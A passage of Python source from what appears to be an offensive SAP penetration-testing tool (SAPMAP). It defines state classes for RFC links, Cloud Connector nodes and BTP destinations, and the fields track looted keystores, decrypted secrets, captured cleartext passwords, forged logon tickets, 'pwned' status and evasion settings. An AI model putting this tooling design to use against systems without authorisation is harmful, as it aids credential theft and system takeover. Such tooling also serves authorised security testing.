            "http_cert_pse": self.http_cert_pse,
            "http_proxy": self.http_proxy,
            "http_target_platform": self.http_target_platform,
            "secstore_password": self.secstore_password,
            "soap_rfc_verified": self.soap_rfc_verified,
            "os_access_type": self.os_access_type,
            "is_ads_dest": self.is_ads_dest,
            "is_btp_dest": self.is_btp_dest,
            "http_status": self.http_status,
            "note_1177315_hit": self.note_1177315_hit,
            "os_exec_verified": self.os_exec_verified,
            "os_exec_channel": self.os_exec_channel,
            "rfc_type": self.rfc_type,
            "target_os_hint": self.target_os_hint,
            "can_create_user": self.can_create_user,
            "can_assign_sap_all": self.can_assign_sap_all,
            "can_assign_role": self.can_assign_role,
            "create_user_probe": self.create_user_probe,
            "create_user_evidence": self.create_user_evidence,
            "create_user_probe_at": self.create_user_probe_at,
            "create_user_probe_error": self.create_user_probe_error,
        }

    @classmethod
    def from_dict(cls, d: dict) -> RFCConnection:
        # Filter out unknown keys for forward compatibility
        known = {f.name for f in fields(cls)}
        return cls(**{k: v for k, v in d.items() if k in known})


# ---------------------------------------------------------------------------
# SAP Cloud Connector (SCC) — sibling node type
# ---------------------------------------------------------------------------

@dataclass
class SCCMapping:
    """One row of the SCC 'Cloud To On-Premise' table.

    Stored on SCCNode.mappings as plain dicts (so state.to_dict() stays JSON-safe).
    Use to_dict() / from_dict() to round-trip.
    """
    virtual_host: str = ""
    virtual_port: int = 0
    internal_host: str = ""
    internal_port: int = 0
    protocol: str = ""           # HTTP | HTTPS | RFC | TCP | LDAP | MAIL
    path_allowlist: list = field(default_factory=list)
    path_wildcards: bool = False
    backend_type: str = ""       # abapSys | abapCloud | javaSys | hanaCloud | ...
    principal_propagation: bool = False
    # v1 config API extras (round-tripped through state file)
    authentication_mode: str = ""    # KERBEROS | X509_GENERAL | NONE | ...
    sid: str = ""
    host_in_header: str = ""         # VIRTUAL | INTERNAL
    description: str = ""
    total_resources: int = 0
    enabled_resources: int = 0
    # Tunnel-relay smoke-test results (sapmap_scc_relay.probe_mapping).
    reachable: Optional[bool] = None      # None = not yet probed
    last_probed_at: str = ""              # ISO timestamp of latest probe
    probe_latency_ms: int = 0             # round-trip of last successful probe
    probe_signature: str = ""             # short HTTP banner / TLS / TCP-OK string
    probe_error: str = ""                 # populated when reachable is False

    def to_dict(self) -> dict:
        return {
            "virtual_host": self.virtual_host,
            "virtual_port": self.virtual_port,
            "internal_host": self.internal_host,
            "internal_port": self.internal_port,
            "protocol": self.protocol,
            "path_allowlist": list(self.path_allowlist),
            "path_wildcards": self.path_wildcards,
            "backend_type": self.backend_type,
            "principal_propagation": self.principal_propagation,
            "authentication_mode": self.authentication_mode,
            "sid": self.sid,
            "host_in_header": self.host_in_header,
            "description": self.description,
            "total_resources": self.total_resources,
            "enabled_resources": self.enabled_resources,
            "reachable": self.reachable,
            "last_probed_at": self.last_probed_at,
            "probe_latency_ms": self.probe_latency_ms,
            "probe_signature": self.probe_signature,
            "probe_error": self.probe_error,
        }

    @classmethod
    def from_dict(cls, d: dict) -> SCCMapping:
        known = {f.name for f in fields(cls)}
        return cls(**{k: v for k, v in d.items() if k in known})


def _scc_richness(sn) -> int:
    """Rough "how much loot does this SCC node carry" score, used to
    pick the survivor when merging two alias duplicates.  Higher wins."""
    s = 0
    if getattr(sn, "keystore_extracted", False):    s += 100
    if getattr(sn, "ssfs_decrypted", False):        s += 50
    if getattr(sn, "admin_session_obtained", False):s += 30
    if getattr(sn, "pwned", False):                 s += 30
    s += 10 * len(getattr(sn, "credentials", []) or [])
    s += 5  * len(getattr(sn, "mappings", []) or [])
    s += 5  * len(getattr(sn, "unlocked_keystores", []) or [])
    s += 3  * len(getattr(sn, "ssfs_secrets_keys", []) or [])
    s += 2  * len(getattr(sn, "cves_confirmed", []) or [])
    s += 1  * len(getattr(sn, "cves_suspected", []) or [])
    if getattr(sn, "version", ""):                  s += 5
    return s


def _merge_scc_fields(dst, src) -> None:
    """Copy every field on `src` into `dst` when `dst` has no value.
    Never overwrites existing data on the survivor."""
    scalar_defaults = {
        "": ["ip", "version", "version_source", "bundle_hash",
             "favicon_sha256", "server_header", "tunnel_region",
             "ha_role", "ha_peer_role", "ha_shadow_host",
             "keystore_loot_path", "tunnel_privkey_fp",
             "pp_ca_privkey_fp", "ssfs_secrets_path",
             "users_xml_loot_path", "backup_password", "notes",
             "pp_analysis_at"],
    }
    for empty, names in scalar_defaults.items():
        for name in names:
            if not getattr(dst, name, empty):
                v = getattr(src, name, empty)
                if v:
                    setattr(dst, name, v)
    for name in ("admin_ui_reachable", "admin_session_obtained",
                 "default_creds_live", "keystore_extracted",
                 "tunnel_replayed", "ssfs_decrypted",
                 "principal_propagation_enabled", "pwned"):
        if not getattr(dst, name, False) and getattr(src, name, False):
            setattr(dst, name, True)
    if not getattr(dst, "favicon_mmh3", 0):
        dst.favicon_mmh3 = getattr(src, "favicon_mmh3", 0)
    if not getattr(dst, "pp_weak_count", 0):
        dst.pp_weak_count = getattr(src, "pp_weak_count", 0)
    if not getattr(dst, "tls_fingerprint", {}):
        dst.tls_fingerprint = dict(getattr(src, "tls_fingerprint", {}) or {})
    if not getattr(dst, "pp_analysis", {}):
        dst.pp_analysis = dict(getattr(src, "pp_analysis", {}) or {})
    # List-of-dict / list-of-str merges — dedup by string repr so
    # re-runs are idempotent.
    for name in ("cves_confirmed", "cves_suspected", "cve_details",
                 "subaccount_uuids", "location_ids", "mappings",
                 "ssfs_secrets_keys", "unlocked_keystores",
                 "findings", "credentials"):
        dst_list = list(getattr(dst, name, []) or [])
        src_list = list(getattr(src, name, []) or [])
        seen = {repr(x) for x in dst_list}
        for item in src_list:
            if repr(item) not in seen:
                dst_list.append(item)
                seen.add(repr(item))
        setattr(dst, name, dst_list)
    # Preserve either node's on-map position if the survivor has none.
    if not getattr(dst, "position", None) and getattr(src, "position", None):
        dst.position = src.position


@dataclass
class SCCNode:
    """A SAP Cloud Connector instance — sibling to SAPNode on the map.

    Identifier: ``host`` (string).  Lives in SAPMAPState.scc_nodes keyed by host.
    """
    host: str = ""                              # acts as identifier
    ip: str = ""
    admin_ui_port: int = 8443
    version: str = ""                           # "2.17.1"
    version_source: str = ""                    # "favicon" | "bundle" | "api" | "header"
    bundle_hash: str = ""
    favicon_sha256: str = ""
    favicon_mmh3: int = 0
    tls_fingerprint: dict = field(default_factory=dict)  # {alpn, cipher, version, cert_subject, ...}
    server_header: str = ""
    admin_ui_reachable: bool = False
    admin_session_obtained: bool = False
    default_creds_live: bool = False
    cves_confirmed: list = field(default_factory=list)
    cves_suspected: list = field(default_factory=list)
    cve_details: list = field(default_factory=list)   # [{cve, severity, headline, ref, status}, ...]
    subaccount_uuids: list = field(default_factory=list)
    location_ids: list = field(default_factory=list)
    tunnel_region: str = ""
    principal_propagation_enabled: bool = False
    mappings: list = field(default_factory=list)         # [SCCMapping.to_dict(), ...]
    keystore_extracted: bool = False
    keystore_loot_path: str = ""
    tunnel_privkey_fp: str = ""
    pp_ca_privkey_fp: str = ""
    tunnel_replayed: bool = False
    # SSFS decryption + p12 unlock (sapmap_scc_ssfs_decrypt).
    ssfs_decrypted: bool = False
    ssfs_secrets_path: str = ""             # plaintext side-file (mode 0600)
    ssfs_secrets_keys: list = field(default_factory=list)   # KEY NAMES only
    unlocked_keystores: list = field(default_factory=list)  # [{path, cert_subject, cert_sha256, ...}]
    pwned: bool = False
    findings: list = field(default_factory=list)
    credentials: list = field(default_factory=list)      # SCC local users (Credentials objects)
    position: Optional[tuple] = None
    ha_shadow_host: str = ""
    ha_role: str = ""               # "master" | "shadow" | "" (no HA / unknown)
    ha_peer_role: str = ""          # role of ha_shadow_host ("shadow" if we are master, etc.)
    notes: str = ""
    # In-memory only — not persisted. Set when Extract Keystore is run.
    backup_password: str = field(default="", repr=False)
    users_xml_loot_path: str = ""   # path to cached plaintext users.xml on disk
    # Principal-Propagation analyser result (sapmap_scc_pp_analyzer).
    # Populated after every keystore extract / mapping harvest, plus
    # on-demand via the "Analyse Principal Propagation" menu action.
    # Shape: {ok, method, findings: [...], summary: {critical, high, medium},
    #         pp_config: {...}, trust: {...}, analyzed_at: "..."}.
    pp_analysis: dict = field(default_factory=dict)
    pp_analysis_at: str = ""        # ISO timestamp of last analyse run
    pp_weak_count: int = 0          # critical+high count for badge rendering

    def to_dict(self) -> dict:
        return {
            "host": self.host,
            "ip": self.ip,
            "admin_ui_port": self.admin_ui_port,
            "version": self.version,
            "version_source": self.version_source,
            "bundle_hash": self.bundle_hash,
            "favicon_sha256": self.favicon_sha256,
            "favicon_mmh3": self.favicon_mmh3,
            "tls_fingerprint": dict(self.tls_fingerprint),
            "server_header": self.server_header,
            "admin_ui_reachable": self.admin_ui_reachable,
            "admin_session_obtained": self.admin_session_obtained,
            "default_creds_live": self.default_creds_live,
            "cves_confirmed": list(self.cves_confirmed),
            "cves_suspected": list(self.cves_suspected),
            "cve_details": [dict(d) for d in (self.cve_details or [])],
            "subaccount_uuids": list(self.subaccount_uuids),
            "location_ids": list(self.location_ids),
            "tunnel_region": self.tunnel_region,
            "principal_propagation_enabled": self.principal_propagation_enabled,
            "mappings": list(self.mappings),
            "keystore_extracted": self.keystore_extracted,
            "keystore_loot_path": self.keystore_loot_path,
            "tunnel_privkey_fp": self.tunnel_privkey_fp,
            "pp_ca_privkey_fp": self.pp_ca_privkey_fp,
            "tunnel_replayed": self.tunnel_replayed,
            "ssfs_decrypted": self.ssfs_decrypted,
            "ssfs_secrets_path": self.ssfs_secrets_path,
            "ssfs_secrets_keys": list(self.ssfs_secrets_keys),
            "unlocked_keystores": [dict(k) for k in (self.unlocked_keystores or [])],
            "pwned": self.pwned,
            "findings": [f.to_dict() if hasattr(f, "to_dict") else f
                         for f in self.findings],
            "credentials": [c.to_dict() if hasattr(c, "to_dict") else c
                            for c in self.credentials],
            "position": list(self.position) if self.position else None,
            "ha_shadow_host": self.ha_shadow_host,
            "ha_role": self.ha_role,
            "ha_peer_role": self.ha_peer_role,
            "notes": self.notes,
            "users_xml_loot_path": self.users_xml_loot_path,
            "pp_analysis": dict(self.pp_analysis or {}),
            "pp_analysis_at": self.pp_analysis_at,
            "pp_weak_count": self.pp_weak_count,
            "kind": "scc",
        }

    @classmethod
    def from_dict(cls, d: dict) -> SCCNode:
        known = {f.name for f in fields(cls)}
        clean = {k: v for k, v in d.items() if k in known}
        # backup_password is session-only — never load from persisted state
        clean.pop("backup_password", None)
        if isinstance(clean.get("position"), list):
            clean["position"] = tuple(clean["position"])
        findings_d = clean.get("findings", [])
        clean["findings"] = [Finding.from_dict(f) if isinstance(f, dict) and "severity" in f else f
                             for f in findings_d]
        creds_d = clean.get("credentials", [])
        clean["credentials"] = [Credentials.from_dict(c) if isinstance(c, dict) else c
                                for c in creds_d]
        return cls(**clean)


# ---------------------------------------------------------------------------
# BTP — Subaccount + Destination
# ---------------------------------------------------------------------------

@dataclass
class BTPDestination:
    """A destination defined in an SAP BTP subaccount.

    The high-value field is `password` — when the API token has the
    ``destination_configuration.ApiAccess`` scope, BTP returns it in
    cleartext for `BasicAuthentication` / `OAuth2Password` /
    `OAuth2ClientCredentials` / `OAuth2SAMLBearerAssertion` flows.
    Capturing it gives an attacker (or a SAPMAP operator) a plaintext
    on-prem credential without touching the on-prem network.
    """
    subaccount_uuid: str = ""
    name: str = ""
    type: str = ""                       # "HTTP" | "RFC" | "MAIL" | "LDAP"
    url: str = ""                        # http(s)://target.example or ashost
    proxy_type: str = ""                 # "Internet" | "OnPremise" | "PrivateLink"
    authentication: str = ""             # "BasicAuthentication" | "OAuth2..." | "PrincipalPropagation" | "NoAuthentication"
    user: str = ""
    # Cleartext password / secret captured via ApiAccess scope.  Empty
    # when the scope is absent or the auth type doesn't expose creds
    # (PrincipalPropagation, NoAuthentication).
    password: str = ""
    cleartext_captured: bool = False
    # Inferred linkage to an on-prem SAP system on the map — populated
    # by sap_btp.link_destinations_to_onprem() once the subaccount is
    # enumerated.  Empty when the destination's URL doesn't match any
    # known SAPNode IP/hostname.
    linked_target_sid: str = ""
    linked_via: str = ""                 # "ashost" | "url-host" | "scc-mapping"
    # Audit fields
    description: str = ""
    additional_properties: dict = field(default_factory=dict)
    captured_at: str = ""

    def to_dict(self) -> dict:
        return {
            "subaccount_uuid":      self.subaccount_uuid,
            "name":                 self.name,
            "type":                 self.type,
            "url":                  self.url,
            "proxy_type":           self.proxy_type,
            "authentication":       self.authentication,
            "user":                 self.user,
            "password":             self.password,
            "cleartext_captured":   self.cleartext_captured,
            "linked_target_sid":    self.linked_target_sid,
            "linked_via":           self.linked_via,
            "description":          self.description,
            "additional_properties": self.additional_properties,
            "captured_at":          self.captured_at,
        }

    @classmethod
    def from_dict(cls, data: dict) -> "BTPDestination":
        known = {f.name for f in fields(cls)}
        return cls(**{k: v for k, v in (data or {}).items() if k in known})


@dataclass
class BTPSubaccountNode:
    """An SAP BTP subaccount discovered via a `cf oauth-token`.

    Drawn on the map as a "cloud" node above the on-prem layer, with
    edges to the SCCs that tunnel into it and red edges to any on-prem
    SAPNode whose credentials the BTP destinations leaked.
    """
    uuid: str = ""                       # GUID — primary identifier
    display_name: str = ""
    region: str = ""                     # "eu10" | "us10" | "ap10" | etc.
    subdomain: str = ""
    parent_global_account: str = ""
    # SCC tunnel information — which Cloud Connectors register against
    # this subaccount.  Each entry = a host string from
    # /connectivity/v1/cloudConnectorMappings; cross-referenced against
    # state.scc_nodes for the visual edge.
    scc_locations: list = field(default_factory=list)   # [{location_id, scc_host_uuid}]
    # Destinations harvested via /destinations.  Each one gets its own
    # BTPDestination row with optional cleartext password captured.
    destinations: list = field(default_factory=list)     # [BTPDestination.to_dict(), ...]
    # IAS tenant FQDN attached to this subaccount (optional, populated
    # in a follow-up Week-5 step).  Carried here as a forward slot so
    # serialisation stays stable.
    ias_tenant: str = ""
    # Token telemetry — the token itself NEVER serialises (live in
    # SAPMAPApi memory only).  These fields just carry whatever the
    # token's `userInfo` claim revealed about *who* extracted what.
    enumerated_via_user: str = ""
    enumerated_via_email: str = ""
    enumerated_at: str = ""
    # Visual position on the map (cloud tier)
    position: Optional[tuple] = None
    # Truthy when at least one destination password was captured in
    # cleartext, OR a custom IdP / wildcard PP rule was found.  Drives
    # the ⚡ overlay on the cloud node.
    pwned: bool = False
    # Set True when a source SAP system's X.509 identity (STRUST PSE)
    # authenticated at the TLS layer against this BTP tenant but the
    # kernel-proxied HTTP call came back non-2xx (401 / 403 / 404).
    # Meaning: the cert IS trusted at the transport layer, we just
    # weren't authorized for that specific endpoint.  Distinct from
    # ``pwned`` because we haven't demonstrably enumerated resources
    # yet; still worth surfacing so the operator knows this on-prem
    # → cloud trust bridge exists.
    cert_auth_trusted: bool = False
    # Critical-finding flag mirrors the SAPNode field so the frontend
    # can style BTP tenants that received a CRITICAL finding (e.g. a
    # 2xx cert-auth response = full kernel-proxied access).
    has_critical_finding: bool = False
    findings: list = field(default_factory=list)    # [Finding, ...]

    def to_dict(self) -> dict:
        return {
            "uuid":                  self.uuid,
            "display_name":          self.display_name,
            "region":                self.region,
            "subdomain":             self.subdomain,
            "parent_global_account": self.parent_global_account,
            "scc_locations":         list(self.scc_locations),
            "destinations":          [
                d.to_dict() if hasattr(d, "to_dict") else d
                for d in (self.destinations or [])
            ],
            "ias_tenant":            self.ias_tenant,
            "enumerated_via_user":   self.enumerated_via_user,
            "enumerated_via_email":  self.enumerated_via_email,
            "enumerated_at":         self.enumerated_at,
            "position":              list(self.position) if self.position else None,
            "pwned":                 self.pwned,
            "cert_auth_trusted":     self.cert_auth_trusted,
            "has_critical_finding":  self.has_critical_finding,
            "findings":              [f.to_dict() if hasattr(f, "to_dict") else f
                                       for f in (self.findings or [])],
        }

    @classmethod
    def from_dict(cls, data: dict) -> "BTPSubaccountNode":
        d = dict(data or {})
        d["destinations"] = [BTPDestination.from_dict(x)
                              for x in d.get("destinations", [])]
        d["findings"] = [Finding(**x) if isinstance(x, dict) else x
                          for x in d.get("findings", [])]
        if d.get("position") and isinstance(d["position"], list):
            d["position"] = tuple(d["position"])
        known = {f.name for f in fields(cls)}
        return cls(**{k: v for k, v in d.items() if k in known})


_BARE_AWS_DEFAULT_HOST_RE = _re.compile(
    r'^(ec2|s3)([.-][a-z0-9.-]+)?\.amazonaws\.com$', _re.IGNORECASE)


def _is_bare_aws_default_node(node) -> bool:
    """Return True when `node` is a placeholder auto-materialised
    from one of the two SAP-shipped Type-G HTTP destinations
    (CSI_AWS_EC2, CSI_AWS_S3) that ship with every S/4 system and
    point at ec2.amazonaws.com / s3.amazonaws.com — with no stored
    credentials and no other enrichment.

    Mirrors the JS-side `_isBareAwsDefaultNode` filter that hides
    these placeholders from the map.  Called from `add_node` so we
    don't emit the misleading "New SAP system plotted" INFO
    finding for a node the operator will never see on the map.
    """
    if node is None:
        return False
    host = (getattr(node, "hostname", "") or "").lower()
    ip = (getattr(node, "ip", "") or "").lower()
    if (not _BARE_AWS_DEFAULT_HOST_RE.match(host)
            and not _BARE_AWS_DEFAULT_HOST_RE.match(ip)):
        return False
    # If anything real has already landed on the node, it stops
    # being a "bare" default — pwn state, credentials, findings,
    # real open ports.
    any_real_port = any(
        i and getattr(i, "ports", None) and len(i.ports) > 0
        for i in (getattr(node, "instances", None) or []))
    return not (
        getattr(node, "pwned", False)
        or (getattr(node, "credentials", None) or [])
        or (getattr(node, "created_users", None) or [])
        or (getattr(node, "findings", None) or [])
        or getattr(node, "gw_vulnerable", False)
        or getattr(node, "ms_vulnerable", False)
        or getattr(node, "cve_2025_31324_vulnerable", False)
        or getattr(node, "cve_2020_6287_vulnerable", False)
        or getattr(node, "cve_2022_22536_vulnerable", False)
        or any_real_port)


# ---------------------------------------------------------------------------
# SAPMAPState — full session state (serializable)
# ---------------------------------------------------------------------------

@dataclass
class SAPMAPState:
    """Complete SAPMAP session state — nodes, connections, tracking, config."""

    nodes: dict = field(default_factory=dict)           # sid -> SAPNode
    connections: list = field(default_factory=list)      # [RFCConnection, ...]
    created_users: list = field(default_factory=list)    # global [CreatedUser, ...]
    created_destinations: list = field(default_factory=list)  # [{dest_name, source_sid, target_sid, ...}]
    rfc_check_cache: dict = field(default_factory=dict)  # {dest_name: result_dict}
    # Forged MYSAPSSO2 logon tickets — mirror of every issuer's
    # SAPNode.forged_tickets so the UI can enumerate the full set
    # without iterating every node.  See ForgedTicket dataclass.
    forged_tickets: list = field(default_factory=list)   # global [ForgedTicket, ...]
    # STRUSTSSO2 trust edges discovered across the landscape.
    # Each entry: TrustRelation(trusting_sid → issuer_sid).
    # Drives the TRUSTS_ISSUER edges in chain analysis and the
    # auto-fanout target list when a PSE is stolen.
    trust_relations: list = field(default_factory=list)  # [TrustRelation, ...]
    scc_nodes: dict = field(default_factory=dict)        # host -> SCCNode (Cloud Connectors)
    btp_subaccounts: dict = field(default_factory=dict)  # uuid -> BTPSubaccountNode
    scan_config: dict = field(default_factory=dict)
    # Tier 2 OPSEC settings (terminal-name spoof, etc.).  Stored as a
    # plain dict on the SAPMAPState boundary to keep import order light
    # — the postex module that owns EvasionConfig already depends on
    # sapmap_models; reversing it would create a cycle.
    evasion: dict = field(default_factory=dict)
    timestamp: str = ""
    version: str = "1.0"

    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now().isoformat()

    # -- Node management --

    def _resolve_add_node_key(self, node: SAPNode) -> str:
        """Return the storage key add_node should use for ``node``.

        Same SID + same physical host → the bare SID (merge/overwrite).
        Same SID + different host → mangled ``<sid>@<anchor>`` so both
        systems survive on the map.  Empty anchors (placeholder waiting
        to be filled) merge into the existing entry.
        """
        n_ip = (node.ip or "").strip()
        n_host = (node.hostname or "").strip().lower()
        existing = self.nodes.get(node.sid)
        if existing is None:
            return node.sid
        e_ip = (existing.ip or "").strip()
        e_host = (existing.hostname or "").strip().lower()
        # Merge when either side has no physical anchor at all
        # (placeholder cases).
        if not (e_ip or e_host) or not (n_ip or n_host):
            return node.sid
        # Merge when any anchor matches — same physical host.
        if (e_ip and e_ip == n_ip) or (e_host and e_host == n_host):
            return node.sid
        # Genuine collision on a different host — mangle deterministically.
        anchor = n_ip or n_host
        return f"{node.sid}@{anchor}"

    def add_node(self, node: SAPNode) -> None:
        # Resolve storage key: usually node.sid, but split same-SID
        # collisions on different physical hosts (SAP Diagnostics
        # Agent 'DAA' replicates on every host; SIDs like JP1 can span
        # multiple app servers).  Without the split the second write
        # silently overwrites the first, keeping its stale map
        # position — which drags its new zone's siblings into the
        # wrong column on the map.
        key = self._resolve_add_node_key(node)
        if key != node.sid:
            print(f"[!] SID collision: '{node.sid}' already stored for a "
                  f"different host; new instance keyed as '{key}'")
            node.sid = key
        is_new = key not in self.nodes
        self.nodes[key] = node
        if is_new:
            # Suppress the "New system plotted" finding for the two
            # SAP-shipped ec2/s3 CSI Type-G placeholders that the
            # front-end explicitly hides — otherwise the operator
            # sees an INFO ping about a system that never appears
            # on the map, which is confusing.
            _visible_on_map = not _is_bare_aws_default_node(node)
            if _visible_on_map:
                try:
                    from sapmap_findings import emit_finding
                    host = node.ip or node.hostname or "?"
                    sys_type = node.system_type or "SAP"
                    kernel = f" K:{node.kernel}" if node.kernel else ""
                    emit_finding(
                        "INFO", node.sid,
                        f"New {sys_type} system plotted — {host}{kernel}",
                    )
                except Exception:
                    pass
            # Re-link any WD-discovered backend placeholders that
            # match the newly-added node's kernel/release/hostname.
            # Without this, a WD-only first scan + a separate scan of
            # the backend IP leaves the WD's wd_backends entry stuck
            # on the placeholder.  Cheap (in-memory string match);
            # bails silently if the scanner module isn't importable
            # (keeps the model module dependency-free for tests).
            try:
                import sapmap_scanner as _scanner
                _scanner.match_wd_backends_to_nodes(
                    list(self.nodes.values()),
                    promote_unmatched=False,    # don't create new
                                                  # placeholders here;
                                                  # only RE-link.
                )
            except Exception:
                pass
        # Re-match unresolved RFC connections against the new node
        node_ips = node.all_ips()
        node_names = node.all_hostnames()
        node_instances = set(node.instance_nrs())
        for conn in self.connections:
            if conn.target_sid:
                continue
            candidates = [s.strip() for s in (conn.target_host, conn.target_ip)
                          if s and s.strip()]
            for val in candidates:
                if val in node_ips or val.lower() in node_names:
                    # If the connection has an instance nr, verify it matches
                    conn_inst = (conn.target_instance_nr or "").strip()
                    if conn_inst and node_instances:
                        if conn_inst.zfill(2) not in node_instances:
                            break  # host matches but wrong instance
                    conn.target_sid = node.sid
                    break

    def remove_node(self, sid: str) -> bool:
        """Remove a node and all associated connections/created users.

        Also detaches any WD `wd_backends` entries that pointed at this
        SID via `linked_node_sid`, so the WD's backend list doesn't
        carry phantom references that would re-create the placeholder
        on the next rediscover.
        """
        if sid not in self.nodes:
            return False
        del self.nodes[sid]
        self.connections = [c for c in self.connections
                           if c.source_sid != sid and c.target_sid != sid]
        self.created_users = [u for u in self.created_users if u.sid != sid]
        # Drop forged tickets issued by the deleted node — they're
        # tied to that node's signing PSE and become orphans.  Tickets
        # FROM other systems that target this SID via recipient pinning
        # are kept (the SID may come back; users can still re-test).
        self.forged_tickets = [t for t in self.forged_tickets
                               if t.sid != sid]
        # Detach WD backend links pointing at the now-deleted node so
        # an operator-initiated delete doesn't surface as a phantom
        # reference on the next rediscover.  The corresponding URL
        # prefixes / admin-table data stay on the WD's wd_backends so
        # the operator can re-promote if they delete by accident.
        for wd in self.nodes.values():
            for bk in (getattr(wd, "wd_backends", None) or []):
                if bk.get("linked_node_sid", "") == sid:
                    bk["linked_node_sid"] = ""
        return True

    def get_node(self, sid: str) -> Optional[SAPNode]:
        return self.nodes.get(sid)

    def rename_node_sid(self, old_sid: str, new_sid: str) -> str:
        """Rename a node's SID and update every referring field.

        Called by the operator-facing "Set SID" action — used most often
        to replace a placeholder Wxx / UNK_<ip> generated by the
        discovery cascade with the real three-letter SID once the
        operator has confirmed it.

        Returns "" on success, or an error string the caller can show.

        Side-effects: re-keys self.nodes, rewrites node.sid, then walks
        every collection that stores SIDs by value (connections,
        created_users, forged_tickets, created_destinations,
        secstore_entries, WD backend links) and rewrites matches.
        """
        if old_sid == new_sid:
            return ""
        if old_sid not in self.nodes:
            return f"Node {old_sid} not found"
        if new_sid in self.nodes:
            return f"Node {new_sid} already exists on the map"

        node = self.nodes.pop(old_sid)
        node.sid = new_sid
        self.nodes[new_sid] = node

        for c in self.connections:
            if c.source_sid == old_sid:
                c.source_sid = new_sid
            if c.target_sid == old_sid:
                c.target_sid = new_sid

        for u in self.created_users:
            if getattr(u, "sid", "") == old_sid:
                u.sid = new_sid

        for t in self.forged_tickets:
            if getattr(t, "sid", "") == old_sid:
                t.sid = new_sid
            if getattr(t, "recipient_sid", "") == old_sid:
                t.recipient_sid = new_sid
            if getattr(t, "issuer_sid", "") == old_sid:
                t.issuer_sid = new_sid
            if getattr(t, "trusting_sid", "") == old_sid:
                t.trusting_sid = new_sid

        for d in (self.created_destinations or []):
            if d.get("source_sid") == old_sid:
                d["source_sid"] = new_sid
            if d.get("target_sid") == old_sid:
                d["target_sid"] = new_sid

        for n in self.nodes.values():
            for e in (getattr(n, "secstore_entries", None) or []):
                if e.get("source_sid") == old_sid:
                    e["source_sid"] = new_sid
            for e in (getattr(n, "java_secstore_entries", None) or []):
                if e.get("target_sid") == old_sid:
                    e["target_sid"] = new_sid
            for e in (getattr(n, "java_destinations", None) or []):
                if e.get("target_sid") == old_sid:
                    e["target_sid"] = new_sid
            for bk in (getattr(n, "wd_backends", None) or []):
                if bk.get("linked_node_sid") == old_sid:
                    bk["linked_node_sid"] = new_sid
            if getattr(n, "discovered_via_wd_sid", "") == old_sid:
                n.discovered_via_wd_sid = new_sid
            if getattr(n, "linked_target_sid", "") == old_sid:
                n.linked_target_sid = new_sid
            for s in (getattr(n, "ssh_access", None) or []):
                if isinstance(s, dict) and s.get("from_sid") == old_sid:
                    s["from_sid"] = new_sid

        return ""

    def find_node_by_host(self, hostname: str = "", ip: str = "",
                          instance_nr: str = "") -> Optional[SAPNode]:
        """Find a node matching a hostname or IP.

        Both parameters are checked against both IPs and hostnames,
        since RFC destinations often store an IP in the host field.

        When *instance_nr* is provided, prefer the node whose instances
        contain that number.  If multiple nodes share the same host but
        only one has the matching instance, that one wins.  Without an
        instance_nr (or when only one node matches) the first match is
        returned — preserving backward-compatible behaviour.
        """
        candidates = [s.strip() for s in (hostname, ip) if s and s.strip()]
        matches = []
        for node in self.nodes.values():
            node_ips = node.all_ips()
            node_names = node.all_hostnames()
            for val in candidates:
                if val in node_ips or val.lower() in node_names:
                    matches.append(node)
                    break

        if not matches:
            return None
        if not instance_nr:
            return matches[0]

        # Validate instance number against candidates
        inst = instance_nr.strip().zfill(2)
        for node in matches:
            if inst in node.instance_nrs():
                return node

        # Single match but wrong instance — not the same system
        if len(matches) == 1:
            node_insts = matches[0].instance_nrs()
            if node_insts and inst not in node_insts:
                return None
            return matches[0]  # no instances known yet, accept it

        # Multiple matches, none with matching instance — no match
        return None

    def find_node_by_instance(self, host: str, instance_nr: str) -> Optional[SAPNode]:
        """Find a node matching host + instance number."""
        return self.find_node_by_host(hostname=host, ip=host,
                                      instance_nr=instance_nr)

    def find_scc_by_alias(self, candidate: str):
        """Look up an existing SCC node by host OR ip alias.

        SCC HA-peer discovery paths get the peer's *host* string from
        different sources (REST API returns the operator-configured
        hostname like "s4hanadev"; backup zip returns whatever was in
        scc_config.ini).  Meanwhile the peer may already be on the map
        under its IP because it was in the original scan target list.
        A raw dict-key lookup misses this and materialises a duplicate
        SCC node — the exact bug where a Master↔Shadow link ends up
        pointing at a new "s4hanadev" node instead of the existing
        "192.168.2.209" one.

        Match rules, checked in order:
          1. Exact key match (fastest — the common case)
          2. Any existing node's .host or .ip equals candidate
          3. DNS: gethostbyname(candidate) matches an existing .ip,
             or gethostbyaddr(candidate) matches an existing .host

        Returns (key, SCCNode) on a hit; None otherwise.
        """
        if not candidate:
            return None
        c = candidate.strip()
        if not c:
            return None
        # 1. Exact key
        if c in self.scc_nodes:
            return c, self.scc_nodes[c]
        # 2. Host / ip field on any existing node
        cl = c.lower()
        for k, n in self.scc_nodes.items():
            if (n.host or "").lower() == cl or (n.ip or "").lower() == cl:
                return k, n
        # 3. Cross-reference SAP nodes on the map — a SAP node at
        #    the same IP as an SCC will typically know the local
        #    hostname (e.g. "s4hanadev") that the SCC's HA-peer
        #    payload uses.  This is the common case: the target
        #    reports its own bare hostname, which never resolves
        #    from the operator's machine.
        try:
            sap_ips = set()
            for sn in getattr(self, "nodes", {}).values():
                names = {h.lower() for h in
                         (getattr(sn, "all_hostnames", lambda: [])() or [])}
                ips = set(getattr(sn, "all_ips", lambda: [])() or [])
                # Fallbacks in case a SAPNode lacks the helpers.
                if not names and getattr(sn, "hostname", ""):
                    names = {sn.hostname.lower()}
                if not ips and getattr(sn, "ip", ""):
                    ips = {sn.ip}
                if cl in names or c in ips:
                    sap_ips.update(ips)
                    sap_ips.update(names)
            if sap_ips:
                for k, n in self.scc_nodes.items():
                    if ((n.host or "").lower() in sap_ips
                            or (n.ip or "") in sap_ips):
                        return k, n
        except Exception:
            pass
        # 4. DNS round-trip — swallow every socket error so a lookup
        #    against an internal-only host never blocks or raises.
        try:
            import socket
            resolved_ip = ""
            try:
                resolved_ip = socket.gethostbyname(c)
            except Exception:
                pass
            resolved_host = ""
            try:
                resolved_host = socket.gethostbyaddr(c)[0]
            except Exception:
                pass
            for k, n in self.scc_nodes.items():
                if resolved_ip and (n.ip or "") == resolved_ip:
                    return k, n
                if resolved_host and (n.host or "").lower() == resolved_host.lower():
                    return k, n
                # And symmetrically: resolve the existing node's alias
                # too, so an existing "s4hanadev" node matches a peer
                # given as "192.168.2.209".
                try:
                    if n.host and n.host != n.ip:
                        n_ip = socket.gethostbyname(n.host)
                        if n_ip == c:
                            return k, n
                except Exception:
                    pass
        except Exception:
            pass
        return None

